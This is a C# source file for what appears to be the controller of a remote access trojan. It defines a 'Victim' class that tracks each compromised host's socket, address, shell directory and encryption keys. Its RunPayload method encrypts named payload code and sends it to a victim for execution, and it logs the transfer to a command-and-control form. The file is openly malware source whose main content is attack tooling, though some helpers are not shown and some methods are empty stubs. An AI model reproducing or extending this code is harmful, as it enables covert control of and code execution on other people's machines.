using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

#pragma warning disable CS8602

public class Victim
{
    public Socket socket;
    public byte[] buffer = new byte[65536];
    public string ID;
    public string rAddr; //Remote address.
    public int rPort; //Remote port.
    public string shell_cd; //SHELL CURRENT DIR
    public bool unix_like;

    //CRYPTOGRAPHY
    public (string PublicKey, string PrivateKey) KeyPairs;
    public (byte[] Key, byte[] IV) _AES;

    public Victim(Socket socket)
    {
        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        this.socket = socket;
        rAddr = split[0];
        rPort = int.Parse(split[1]);
    }

    public void Send(int Command, int Param, byte[] buffer)
    {
        if (buffer != null)
        {
            try
            {
                byte _command = (byte)Command;
                byte _param = (byte)Param;
                buffer = new RP(_command, _param, buffer).GetBytes();
                C2.sent += buffer.Length;
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch
                    {
                        MessageBox.Show("OH SHIT!");
                    }
                }), buffer);
            }
            catch (Exception ex)
            {
                MessageBox.Show("OH SHIT!");
            }
        }
    }

    public void RunPayload(string name, Victim v, string[] para = null)
    {
        string class_str = C1.GetPayload(name);
        string payload = $"{name}|{Encoding.UTF8.GetString(C1.StrE2B64Byte(class_str))}";
        if (para != null)
            payload += "|" + string.Join("|", para);
        payload = Crypto.AESEncrypt(payload, v._AES.Key, v._AES.IV);
        byte[] buffer = Encoding.UTF8.GetBytes(payload);
        v.Send(2, 0, buffer);

        C2.form1.TransportStatus($"Sent payload[{name}] to {v.ID}, size : {buffer.Length}");
    }

    public void Reconnect()
    {

    }

    public void Disconnect(bool delete)
    {

    }
}